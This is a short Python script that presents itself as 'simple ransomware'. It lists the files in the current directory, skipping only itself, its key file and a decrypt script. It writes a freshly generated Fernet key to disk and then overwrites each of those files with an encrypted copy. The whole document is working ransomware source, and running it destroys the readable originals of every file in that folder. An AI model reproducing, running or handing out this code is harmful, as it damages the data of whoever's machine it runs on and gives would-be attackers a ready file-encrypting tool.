#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

#function listing find file 
files = []
for file in os.listdir():
        if file == "rsp-malware.py" or file == "thekey.key" or file == "decrypt.py":
                continue
        files.append(file)
print(files)
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
        thekey.write(key)

for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)

print ("this is simple ransomware to encrypt your files, please do with on your own risk!")
